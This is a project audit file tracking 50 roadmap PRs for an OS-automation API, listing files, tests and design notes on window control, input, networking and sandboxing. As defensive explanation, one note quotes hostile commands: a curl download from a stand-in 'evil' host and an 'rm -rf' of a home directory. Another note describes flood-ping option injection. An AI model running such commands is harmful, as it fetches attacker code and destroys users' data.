# Forensic Audit — WinOs-Layer-
Generated for roadmap PRs #1–#50. Status: `DONE` | `PARTIAL` | `NOT_STARTED`.
Run: `python scripts/forensic_audit.py` (fails if DONE claims lack files/tests).
Tests: `pytest -q -m "not windows"` (fake fixtures via conftest + `tests/linux/` real LinuxBackend).
Live smoke: `python scripts/live_linux_smoke.py` / `DISPLAY=:2 python scripts/live_linux_ui_control_smoke.py`.
**Linux parity:** `LinuxBackend` is default on Linux (`WINOS_BACKEND=auto`); FakeBackend only when forced.

## PR1: Project structure + pyproject + package layout
- **Status:** DONE
- **Files:**
  - `pyproject.toml`
  - `windows_os_api/__init__.py`
  - `README.md`
  - `.gitignore`
- **Tests:**
  - `tests/unit/test_permissions.py`
- **How to run:** `pytest tests/unit/test_permissions.py -q`

## PR2: /v1/health /v1/system /v1/capabilities
- **Status:** DONE
- **Files:**
  - `windows_os_api/api/rest/health.py`
  - `windows_os_api/os/system/service.py`
- **Tests:**
  - `tests/integration/test_api_core.py`
- **How to run:** `pytest tests/integration/test_api_core.py -q`

## PR3: Security core: API keys, RBAC, audit, rate limit
- **Status:** DONE
- **Files:**
  - `windows_os_api/core/security/auth.py`
  - `windows_os_api/core/security/audit.py`
  - `windows_os_api/core/security/rate_limit.py`
  - `windows_os_api/core/permissions/model.py`
- **Tests:**
  - `tests/unit/test_security_core.py`
  - `tests/integration/test_api_core.py`
- **How to run:** `pytest tests/unit/test_security_core.py -q`

## PR4: System info/resources/uptime/power
- **Status:** DONE
- **Files:**
  - `windows_os_api/os/system/service.py`
  - `windows_os_api/api/rest/health.py`
- **Tests:**
  - `tests/integration/test_api_core.py`
  - `tests/unit/test_fake_backend.py`
- **How to run:** `pytest tests/integration/test_api_core.py -q`

## PR5: Processes CRUD/start/terminate
- **Status:** DONE
- **Files:**
  - `windows_os_api/os/processes/service.py`
  - `windows_os_api/api/rest/processes.py`
- **Tests:**
  - `tests/integration/test_api_core.py`
  - `tests/unit/test_fake_backend.py`
- **How to run:** `pytest tests/integration/test_api_core.py -q`

## PR6: App discovery (FakeBackend + Windows registry/paths + Linux .desktop)
- **Status:** DONE
- **Files:**
  - `windows_os_api/apps/discovery/service.py`
  - `windows_os_api/backends/fake.py`
  - `windows_os_api/backends/windows.py`
  - `windows_os_api/backends/linux.py`
- **Tests:**
  - `tests/unit/test_fake_backend.py`
  - `tests/integration/test_api_adapter_automation.py`
- **How to run:** `pytest tests/unit/test_fake_backend.py -q`

## PR7: Windows manager APIs
- **Status:** DONE
- **Files:**
  - `windows_os_api/os/windows/service.py`
  - `windows_os_api/os/windows/geometry.py` — validation, one home, applied by
    every backend at the point that acts
  - `windows_os_api/os/windows/errors.py` — structured `error_code` values
    (`WINDOW_NOT_FOUND`, `WINDOW_STILL_OPEN`, `FOCUS_NOT_GRANTED`,
    `TOOL_UNAVAILABLE`), added alongside the free-text `error`
  - `windows_os_api/api/rest/windows.py` — list/get/focus/close plus
    `move`, `resize`, `minimize`, `maximize`, `restore`
  - `windows_os_api/backends/{linux,windows,fake}.py` — geometry/state ops,
    each verifying the effect by reading it back
- **Tests:**
  - `tests/linux/test_window_manager_linux.py` — real X window under Xvfb + openbox
  - `tests/linux/test_window_contract_linux.py` — focus/close against real windows
  - `tests/windows/test_window_manager_windows.py` — real HWND on windows-latest
  - `tests/windows/test_window_contract_windows.py` — focus/close on windows-latest
  - `tests/unit/test_window_geometry_contract.py`
  - `tests/unit/test_window_focus_close_contract.py`
  - `tests/integration/test_api_os_layers.py`
- **How to run:** `pytest tests/unit/test_window_geometry_contract.py -q`
  (real windows: `xvfb-run -a pytest -m linux -q`)
- **Note:** `move`/`resize`/`minimize`/`maximize` did not exist — zero
  occurrences in either backend — although this entry already read DONE. They
  return the geometry the OS reports **after** the operation, in a field
  separate from the request, because a window manager may offset or quantise
  what it was asked for (measured: a move to (300,200) landed at (302,240); a
  resize to 700x500 came back 700x498). `ok` means the effect was observed, not
  that a command exited 0 — `wmctrl -i -r 99999999 -b add,maximized_vert` exits
  0 for a window id that does not exist.
- **Note (focus/close):** `focus_window` and `close_window` were left on the old
  contract by that change and fixed separately, by owner decision. Both ran
  their tool with `check=False` and returned `{"ok": True}` whatever happened,
  including for a window that did not exist — measured on a window whose
  process had been killed: `xdotool windowclose` exits 1 and `wmctrl -i -c`
  exits **0**. Focus is now read back (`getactivewindow` /
  `GetForegroundWindow`), and closing polls until the window is actually gone,
  because closing is a request an application may refuse. On Windows the
  mechanism differs and the conclusion does not: `PostMessage(WM_CLOSE)` is
  asynchronous, so returning without error never meant the window had closed.

## PR8: UI Automation tree + FakeBackend CRM + real Windows UIA
- **Status:** DONE
- **Files:**
  - `windows_os_api/apps/ui_inspector/service.py`
  - `windows_os_api/apps/ui_inspector/uia_windows.py`
  - `windows_os_api/backends/fake.py`
  - `windows_os_api/backends/windows.py`
- **Tests:**
  - `tests/unit/test_fake_backend.py`
  - `tests/unit/test_adapter_engine.py`
  - `tests/windows/test_uia_hard.py`
- **How to run:** `pytest tests/unit/test_fake_backend.py tests/windows/test_uia_hard.py -q`
- **Notes:** Windows UIA is **implemented** (uiautomation → comtypes → pywinauto). GHA `windows-latest` may lack a full interactive desktop; mark UI tests `requires_display` and skip when session 0.

## PR9: Mouse/keyboard input
- **Status:** DONE
- **Files:**
  - `windows_os_api/os/input/service.py`
  - `windows_os_api/os/input/validation.py` — button/scroll/key/chord/steps
    validation, one home, applied by every backend at the point that acts
  - `windows_os_api/api/rest/ui.py` — move/click/key/type plus `double-click`,
    `scroll`, `drag`, `position`, `keyboard/down`, `keyboard/up`, `hotkey`
  - `windows_os_api/backends/{linux,windows,fake}.py`
- **Tests:**
  - `tests/linux/test_input_linux.py` — delivery read back from `xev` under Xvfb
  - `tests/windows/test_input_windows.py` — real SendInput on windows-latest
  - `tests/unit/test_input_validation_contract.py`
  - `tests/integration/test_api_os_layers.py`
- **How to run:** `pytest tests/unit/test_input_validation_contract.py -q`
  (real delivery: `xvfb-run -a pytest -m linux -q`)
- **Note:** `double_click`, `scroll`, `key_down`, `key_up` and `hotkey` did not
  exist in any backend, and `mouse_drag` existed only in `windows.py`, although
  this entry already read DONE. Two defects found along the way, both on BOTH
  backends: an unknown mouse button fell through to left
  (`{"left": "1", ...}.get(button, "1")`), so a typo performed a left click
  reported as the button the caller named; and `mouse_move` on Linux returned
  `{"ok": True}` for a move that never happened — under a bare Xvfb with no
  window manager, `xdotool mousemove` is a silent no-op and the pointer stays
  at the screen centre. `ok` now means the OS accepted the event; the pointer,
  which IS readable, is verified.

## PR10: Clipboard
- **Status:** DONE
- **Files:**
  - `windows_os_api/os/input/service.py`
  - `windows_os_api/api/rest/ui.py`
- **Tests:**
  - `tests/integration/test_api_os_layers.py`
  - `tests/unit/test_fake_backend.py`
- **How to run:** `pytest tests/integration/test_api_os_layers.py -q`

## PR11: Displays/screenshots
- **Status:** DONE
- **Files:**
  - `windows_os_api/os/display/service.py`
  - `windows_os_api/api/rest/ui.py`
- **Tests:**
  - `tests/integration/test_api_os_layers.py`
- **How to run:** `pytest tests/integration/test_api_os_layers.py -q`

## PR12: Filesystem + sandbox policy
- **Status:** DONE
- **Files:**
  - `windows_os_api/os/filesystem/service.py`
  - `windows_os_api/api/rest/filesystem.py`
  - `windows_os_api/backends/fake.py`
- **Tests:**
  - `tests/integration/test_api_os_layers.py`
  - `tests/security/test_security_hard.py`
- **How to run:** `pytest tests/integration/test_api_os_layers.py -q`

## PR13: Storage/drives
- **Status:** DONE
- **Files:**
  - `windows_os_api/os/storage/service.py`
  - `windows_os_api/api/rest/filesystem.py`
- **Tests:**
  - `tests/integration/test_api_os_layers.py`
- **How to run:** `pytest tests/integration/test_api_os_layers.py -q`

## PR14: Network interfaces/connections + routes, DNS, ping
- **Status:** DONE
- **Files:**
  - `windows_os_api/os/network/service.py`
  - `windows_os_api/os/network/validation.py` — host/IP/ping-bounds validation,
    one home, applied by every backend at the point that acts
  - `windows_os_api/os/network/dns.py` — one resolver, shared by all backends
  - `windows_os_api/api/rest/network.py` — interfaces/connections plus
    `routes`, `dns/resolve`, `dns/reverse`, `ping`
  - `windows_os_api/backends/{linux,windows,fake}.py`
- **Tests:**
  - `tests/linux/test_network_linux.py` — kernel routing table + live resolver
  - `tests/windows/test_network_windows.py` — `route print` + Windows `ping`
  - `tests/unit/test_network_probes_contract.py`
  - `tests/integration/test_api_os_layers.py`
- **How to run:** `pytest tests/unit/test_network_probes_contract.py -q`
- **Note:** `list_routes`, `dns_resolve`/`dns_reverse` and `ping` did not exist,
  although this entry already read DONE. Design notes worth keeping:
  routes come from `/proc/net/route` on Linux (no binary: `ip` is absent on
  minimal systems, and an empty list would read as "no routes" when it meant
  "no tool"); DNS is `socket.getaddrinfo` in **one** shared module rather than
  three copies that could only drift; and `ping` is the first endpoint to hand
  a caller-supplied string to an external program, so a host is validated
  before it gets there. That is **option**-injection defence, not shell
  injection — argv already removes the shell, but `ping -f` is still a flood
  ping if `-f` arrives where a hostname belongs. A hostname cannot begin with
  `-`, which removes the class.

## PR15: Services control
- **Status:** DONE
- **Files:**
  - `windows_os_api/os/services/service.py`
  - `windows_os_api/api/rest/services.py`
- **Tests:**
  - `tests/integration/test_api_os_layers.py`
- **How to run:** `pytest tests/integration/test_api_os_layers.py -q`

## PR16: Audio devices/volume
- **Status:** DONE
- **Files:**
  - `windows_os_api/os/audio/service.py`
  - `windows_os_api/api/rest/services.py`
- **Tests:**
  - `tests/integration/test_api_os_layers.py`
- **How to run:** `pytest tests/integration/test_api_os_layers.py -q`

## PR17: Devices enumeration
- **Status:** DONE
- **Files:**
  - `windows_os_api/os/devices/service.py`
  - `windows_os_api/api/rest/services.py`
- **Tests:**
  - `tests/integration/test_api_os_layers.py`
- **How to run:** `pytest tests/integration/test_api_os_layers.py -q`

## PR18: Printers
- **Status:** DONE
- **Files:**
  - `windows_os_api/os/printers/service.py`
  - `windows_os_api/api/rest/services.py`
- **Tests:**
  - `tests/integration/test_api_os_layers.py`
- **How to run:** `pytest tests/integration/test_api_os_layers.py -q`

## PR19: Users/sessions
- **Status:** DONE
- **Files:**
  - `windows_os_api/os/users/service.py`
  - `windows_os_api/api/rest/services.py`
- **Tests:**
  - `tests/integration/test_api_os_layers.py`
- **How to run:** `pytest tests/integration/test_api_os_layers.py -q`

## PR20: Registry + policy
- **Status:** DONE
- **Files:**
  - `windows_os_api/os/registry/service.py`
  - `windows_os_api/api/rest/services.py`
- **Tests:**
  - `tests/unit/test_fake_backend.py`
  - `tests/integration/test_api_os_layers.py`
- **How to run:** `pytest tests/unit/test_fake_backend.py -q`

## PR21: Terminal execute ALLOW|DENY|ADMIN
- **Status:** DONE
- **Files:**
  - `windows_os_api/os/terminal/allowlist.py` — command registry; commands run as
    argv with `shell=False`, anything unregistered is refused
  - `windows_os_api/os/terminal/service.py` — policy name validation, delegates
  - `windows_os_api/backends/{linux,windows,fake}.py` — **enforcement point**
  - `windows_os_api/api/rest/services.py` — `POST /v1/terminal/execute`
- **Tests:**
  - `tests/security/test_terminal_allowlist.py`
  - `tests/windows/test_terminal_allowlist_windows.py` — WindowsBackend reale su win32
  - `tests/unit/test_fake_backend.py`
  - `tests/integration/test_api_os_layers.py`
  - `tests/security/test_security_hard.py`
- **How to run:** `pytest tests/security/test_terminal_allowlist.py -q`
- **Note:** the previous design screened a raw string against a denylist of shell
  metacharacters and then ran it with `shell=True`. Commands containing none of
  those characters — `curl http://evil/x -o /tmp/x`, `rm -rf /home/user` — passed
  and executed under the plain ALLOW policy. Blocking chaining was never the same
  as blocking execution.

## PR22: Universal Adapter engine
- **Status:** DONE
- **Files:**
  - `windows_os_api/apps/adapters/engine.py`
- **Tests:**
  - `tests/unit/test_adapter_engine.py`
  - `tests/integration/test_api_adapter_automation.py`
- **How to run:** `pytest tests/unit/test_adapter_engine.py -q`

## PR23: App inspector (UI tree flatten/find)
- **Status:** DONE
- **Files:**
  - `windows_os_api/apps/ui_inspector/service.py`
- **Tests:**
  - `tests/unit/test_adapter_engine.py`
- **How to run:** `pytest tests/unit/test_adapter_engine.py -q`

## PR24: Semantic mapper
- **Status:** DONE
- **Files:**
  - `windows_os_api/apps/semantic/mapper.py`
- **Tests:**
  - `tests/unit/test_adapter_engine.py`
  - `tests/e2e/test_universal_adapter_e2e.py`
- **How to run:** `pytest tests/unit/test_adapter_engine.py -q`

## PR25: Action discovery
- **Status:** DONE
- **Files:**
  - `windows_os_api/apps/automation/actions.py`
- **Tests:**
  - `tests/integration/test_api_adapter_automation.py`
- **How to run:** `pytest tests/integration/test_api_adapter_automation.py -q`

## PR26: Workflow recorder
- **Status:** DONE
- **Files:**
  - `windows_os_api/apps/workflows/recorder.py`
  - `windows_os_api/api/rest/workflows.py`
- **Tests:**
  - `tests/unit/test_workflows_agent.py`
- **How to run:** `pytest tests/unit/test_workflows_agent.py -q`

## PR27: Adapter planner
- **Status:** DONE
- **Files:**
  - `windows_os_api/apps/planner/service.py`
- **Tests:**
  - `tests/unit/test_workflows_agent.py`
  - `tests/integration/test_api_adapter_automation.py`
- **How to run:** `pytest tests/unit/test_workflows_agent.py -q`

## PR28: AI UI reasoning (offline + LLM interface)
- **Status:** DONE
- **Files:**
  - `windows_os_api/apps/reasoning/offline.py`
- **Tests:**
  - `tests/unit/test_workflows_agent.py`
- **How to run:** `pytest tests/unit/test_workflows_agent.py -q`

## PR29: Auto workflow gen confidence/risk/rollback
- **Status:** DONE
- **Files:**
  - `windows_os_api/apps/workflows/generator.py`
- **Tests:**
  - `tests/unit/test_workflows_agent.py`
  - `tests/e2e/test_universal_adapter_e2e.py`
- **How to run:** `pytest tests/unit/test_workflows_agent.py -q`

## PR30: Self-healing selectors
- **Status:** DONE
- **Files:**
  - `windows_os_api/apps/healing/service.py`
- **Tests:**
  - `tests/unit/test_workflows_agent.py`
- **How to run:** `pytest tests/unit/test_workflows_agent.py -q`

## PR31: API schema generation
- **Status:** DONE
- **Files:**
  - `windows_os_api/apps/schema/generator.py`
- **Tests:**
  - `tests/unit/test_adapter_engine.py`
- **How to run:** `pytest tests/unit/test_adapter_engine.py -q`

## PR32: Per-app OpenAPI
- **Status:** DONE
- **Files:**
  - `windows_os_api/apps/adapters/engine.py`
  - `windows_os_api/api/rest/apps.py`
- **Tests:**
  - `tests/integration/test_api_adapter_automation.py`
  - `tests/e2e/test_universal_adapter_e2e.py`
- **How to run:** `pytest tests/integration/test_api_adapter_automation.py -q`

## PR33: /v1/apps registry
- **Status:** DONE
- **Files:**
  - `windows_os_api/apps/discovery/service.py`
  - `windows_os_api/api/rest/apps.py`
- **Tests:**
  - `tests/integration/test_api_adapter_automation.py`
- **How to run:** `pytest tests/integration/test_api_adapter_automation.py -q`

## PR34: Intent engine
- **Status:** DONE
- **Files:**
  - `windows_os_api/apps/intent/engine.py`
- **Tests:**
  - `tests/unit/test_workflows_agent.py`
  - `tests/integration/test_api_adapter_automation.py`
- **How to run:** `pytest tests/unit/test_workflows_agent.py -q`

## PR35: Computer agent
- **Status:** DONE
- **Files:**
  - `windows_os_api/apps/agent/computer.py`
- **Tests:**
  - `tests/unit/test_workflows_agent.py`
  - `tests/e2e/test_universal_adapter_e2e.py`
- **How to run:** `pytest tests/unit/test_workflows_agent.py -q`

## PR36: MCP JSON-RPC server
- **Status:** DONE
- **Files:**
  - `windows_os_api/api/mcp/server.py`
- **Tests:**
  - `tests/unit/test_mcp.py`
- **How to run:** `pytest tests/unit/test_mcp.py -q`

## PR37: WebSocket event bus
- **Status:** DONE
- **Files:**
  - `windows_os_api/api/websocket/bus.py`
  - `windows_os_api/core/events/bus.py`
- **Tests:**
  - `tests/unit/test_event_bus.py`
- **How to run:** `pytest tests/unit/test_event_bus.py -q`

## PR38: Remote access policy (localhost default)
- **Status:** DONE
- **Files:**
  - `windows_os_api/core/runtime/config.py`
  - `windows_os_api/core/runtime/app.py`
  - `windows_os_api/api/rest/security_routes.py`
- **Tests:**
  - `tests/integration/test_api_core.py`
- **How to run:** `pytest tests/integration/test_api_core.py -q`

## PR39: Windows service installer scripts/module
- **Status:** DONE
- **Files:**
  - `windows_os_api/installer/service.py`
  - `installer/service_scripts/install_nssm.bat`
- **Tests:**
  - `tests/unit/test_windows_backend_guard.py`
- **How to run:** `pytest tests/unit/test_windows_backend_guard.py -q`

## PR40: Control Center HTML dashboard
- **Status:** DONE
- **Files:**
  - `windows_os_api/control_center/index.html`
  - `windows_os_api/core/runtime/app.py`
- **Tests:**
  - `tests/e2e/test_universal_adapter_e2e.py`
- **How to run:** `pytest tests/e2e/test_universal_adapter_e2e.py -q`

## PR41: Installer packaging (Inno/PyInstaller + GHA Windows Setup.exe)
- **Status:** DONE
- **Files:**
  - `installer/pyinstaller/winos-api.spec`
  - `installer/inno/winos-api.iss`
  - `installer/README.md`
  - `installer/service_scripts/`
  - `scripts/build_installer.py`
  - `.github/workflows/build.yml`
  - `.github/workflows/release.yml`
- **Tests:**
  - `tests/unit/test_build_installer.py`
  - `tests/unit/test_windows_backend_guard.py`
- **How to run:** `python scripts/build_installer.py validate && pytest tests/unit/test_build_installer.py -q`
- **Evidence:** `validate` + checksum unit tests pass on Linux; Linux PyInstaller portable smoke via `build-portable`; GHA `windows-latest` builds `winos-api.exe`, portable zip, and Inno `Setup.exe` (ISCC via chocolatey). Setup.exe is **not** produced on Linux by design — Windows GHA is the release path.

## PR42: Comprehensive automated tests
- **Status:** DONE
- **Files:**
  - `tests/conftest.py`
  - `tests/unit/`
  - `tests/integration/`
  - `tests/security/`
  - `tests/e2e/`
  - `tests/windows/`
- **Tests:**
  - `tests/integration/test_api_core.py`
  - `tests/e2e/test_universal_adapter_e2e.py`
  - `tests/windows/test_windows_backend_hard.py`
- **How to run:** `pytest -m "not windows" -q` (Linux); `pytest -m windows -q` (Windows GHA)

## PR43: GHA CI workflow Linux + windows-latest
- **Status:** DONE
- **Files:**
  - `.github/workflows/ci.yml`
- **Tests:**
  - `scripts/forensic_audit.py`
  - `tests/windows/`
  - `tests/linux/`
- **Note:** Linux job runs fake suite + `pytest -m linux` + live smoke; Windows job keeps fake + windows markers.
- **How to run:** `python scripts/forensic_audit.py`

## PR44: Release workflow with checksums
- **Status:** DONE
- **Files:**
  - `.github/workflows/release.yml`
  - `scripts/build_installer.py`
- **Tests:**
  - `tests/unit/test_build_installer.py`
- **How to run:** `pytest tests/unit/test_build_installer.py -q`

## PR45: Auto-update verify/backup/rollback
- **Status:** DONE
- **Files:**
  - `windows_os_api/update/manager.py`
- **Tests:**
  - `tests/unit/test_update_manager.py`
- **How to run:** `pytest tests/unit/test_update_manager.py -q`

## PR46: Security tests injection/path traversal
- **Status:** DONE
- **Files:**
  - `tests/security/test_security_hard.py`
- **Tests:**
  - `tests/security/test_security_hard.py`
- **How to run:** `pytest tests/security/test_security_hard.py -q`

## PR47: Adapter sandbox permissions
- **Status:** DONE
- **Files:**
  - `windows_os_api/apps/sandbox/permissions.py` — policy model and `check_action`
  - `windows_os_api/api/rest/security_routes.py` — `PUT/GET /v1/sandbox/policy`
  - `windows_os_api/apps/adapters/engine.py` — **enforcement point**: `invoke_action`
    calls `check_action` before reaching the backend, so the policy applies to every
    caller (REST, MCP, workflow playback, agent) instead of only the REST route
- **Tests:**
  - `tests/unit/test_trust_and_sandbox.py`
  - `tests/unit/test_sandbox_enforcement.py` — one test per surface that used to bypass the gate
  - `tests/integration/test_api_adapter_automation.py`
- **How to run:** `pytest tests/unit/test_trust_and_sandbox.py tests/unit/test_sandbox_enforcement.py -q`

## PR48: Signed adapter trust levels
- **Status:** DONE
- **Files:**
  - `windows_os_api/apps/trust/signing.py`
  - `windows_os_api/api/rest/security_routes.py`
- **Tests:**
  - `tests/unit/test_trust_and_sandbox.py`
- **How to run:** `pytest tests/unit/test_trust_and_sandbox.py -q`

## PR49: Observability metrics endpoint
- **Status:** DONE
- **Files:**
  - `windows_os_api/observability/metrics.py`
  - `windows_os_api/api/rest/security_routes.py`
- **Tests:**
  - `tests/integration/test_api_adapter_automation.py`
- **How to run:** `pytest tests/integration/test_api_adapter_automation.py -q`

## PR50: E2E universal adapter path on FakeBackend CRM
- **Status:** DONE
- **Files:**
  - `windows_os_api/backends/fake.py`
  - `tests/fixtures/crm_ui_tree.json`
- **Tests:**
  - `tests/e2e/test_universal_adapter_e2e.py`
- **How to run:** `pytest tests/e2e/test_universal_adapter_e2e.py -q`

## Summary
- DONE: 50 (+ Linux gaps closed)
- PARTIAL: 0
- NOT_STARTED: 0

## LinuxBackend parity (post-PR50)
- **Status:** DONE
- **Files:**
  - `windows_os_api/backends/linux.py` (AT-SPI rich tree + find/click/set_text; wmctrl/xclip/mss/xdotool)
  - `windows_os_api/backends/factory.py`
  - `windows_os_api/backends/base.py`
  - `windows_os_api/core/runtime/config.py`
  - `windows_os_api/os/system/service.py` (honest capability flags)
  - `windows_os_api/api/rest/ui.py` (`/ui/tree`, `/ui/find`, `/ui/click`, `/ui/set-text`)
  - `windows_os_api/apps/ui_inspector/service.py`
  - `tests/linux/test_linux_backend.py`
  - `tests/linux/test_linux_ui_control.py`
  - `scripts/live_linux_smoke.py`
  - `scripts/live_linux_ui_control_smoke.py`
- **Tests:**
  - `pytest -m linux`
  - `pytest -m "not windows"`
  - `DISPLAY=:2 python scripts/live_linux_ui_control_smoke.py`
- **N/A (by design, not PARTIAL):** Windows UIA on Linux — use AT-SPI / wmctrl / xdotool instead (`windows_uia=false`).
- **Notes:** Screenshot requires `mss` + `DISPLAY`; audio/services hard-assert when `pactl`/`systemctl` present, skip only when binary absent.

## WindowsBackend real UIA / SendInput / screenshot (post-PR50)
- **Status:** DONE
- **Files:**
  - `windows_os_api/backends/windows.py` (SendInput mouse/key/type, EnumDisplayMonitors, mss/Pillow/BitBlt screenshot, `_uia_tree` → uia_windows)
  - `windows_os_api/apps/ui_inspector/uia_windows.py` (rich tree, find, invoke_click, set_value)
  - `tests/windows/test_windows_backend_hard.py`
  - `tests/windows/test_uia_hard.py`
  - `scripts/live_windows_smoke.py`
  - `.github/workflows/ci.yml` (`pip install -e ".[dev,windows]"`, `pytest -m windows`, live smoke)
- **Tests:**
  - `pytest -m windows` on win32
  - `pytest -m "not windows"` on Linux (must stay green)
  - `python scripts/live_windows_smoke.py`
- **GHA display limits:** Process / FS / registry / clipboard / SendInput structure tests **must pass** headless. UIA Notepad tree, mouse click, and screenshot are marked `requires_display` and skip when no interactive desktop / session 0.
- **Still needs a real Windows desktop:** Full Notepad UIA children + type-into-Edit + non-empty screenshot PNG. Headless GHA may skip those while still validating non-UI APIs.



## Linux capability gaps closed (vision / Wayland / audio / services / privilege)
- **Status:** DONE
- **Files:**
  - `windows_os_api/apps/vision/ocr.py` (Pillow template OCR + optional tesseract; find/click)
  - `windows_os_api/backends/linux_session.py` (X11/Wayland detect + command construction)
  - `windows_os_api/backends/linux_audio.py` (pactl/wpctl list/volume/mute)
  - `windows_os_api/backends/linux_services.py` (systemctl user+system; unit name sanitization)
  - `windows_os_api/core/security/privilege.py` (ADMIN + WINOS_ALLOW_PRIVILEGED; pkexec/sudo -n; audit)
  - `windows_os_api/backends/linux.py` (wired caps, input, windows, audio, services, sessions)
  - `windows_os_api/apps/adapters/engine.py` (vision fallback when UI tree empty)
  - `windows_os_api/apps/ui_inspector/service.py` (vision find/click fallback)
  - `windows_os_api/api/rest/services.py` (`/v1/session`, `/v1/privilege/elevate`, audio set)
  - `windows_os_api/api/rest/ui.py` (`/ui/vision/find`, `/ui/vision/click`)
- **Tests:**
  - `tests/linux/test_vision_ocr.py`
  - `tests/linux/test_wayland_session.py`
  - `tests/linux/test_audio_services.py`
  - `tests/security/test_privilege_gated.py`
  - `tests/unit/test_vision_and_session_unit.py`
  - `tests/security/test_security_hard.py` (path traversal / shell still blocked)
- **How to run:** `pytest -q -m "not windows"`
- **Honest limits:** Wayland compositor variance; OCR accuracy without tesseract; privilege never silent root.
